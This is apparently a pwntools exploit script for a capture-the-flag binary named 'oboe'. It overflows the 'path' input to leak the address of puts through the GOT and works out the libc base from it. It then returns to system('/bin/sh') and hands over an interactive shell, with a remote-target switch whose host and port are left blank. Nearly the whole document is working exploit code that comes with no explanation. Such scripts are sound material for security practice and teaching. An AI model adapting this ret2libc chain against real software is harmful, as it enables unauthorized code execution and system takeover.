from pwn import *

HOST = ""
PORT = ""

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
continue
""".format(
    **locals()
)

# Binary filename
exe = "./oboe"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
# ld = ELF("./ld-2.27.so")

# Start program
io = start()
offset = 0
# Build the payload

# Send the payload
io.sendlineafter(b"protocol:", b"A" * 64)
io.sendlineafter(b"domain:", b"B" * 64)
payload = b"C" * 17
payload += p32(elf.plt["puts"])
payload += p32(elf.sym["main"])
payload += p32(elf.got["puts"])
payload = payload.ljust(55, b"D")
payload += b"~"

io.sendlineafter(b"path:", payload)
io.recvuntil(b"~\n")

LEAK_PUTS = u32(io.recv(4))

info("PUTS: " + hex(LEAK_PUTS))

libc.address = LEAK_PUTS - libc.sym["puts"]
info("LIBC: " + hex(libc.address))
# # print(io.recvline)

binsh = libc.search(b"/bin/sh\x00").__next__()

# Send the payload
io.sendlineafter(b"protocol:", b"A" * 64)
io.sendlineafter(b"domain:", b"B" * 64)
payload = b"C" * 17
payload += p32(libc.sym["system"])
payload += p32(elf.sym["main"])
payload += p32(binsh)
payload = payload.ljust(55, b"D")
payload += b"~"

io.sendlineafter(b"path:", payload)
# # Got Shell?
io.interactive()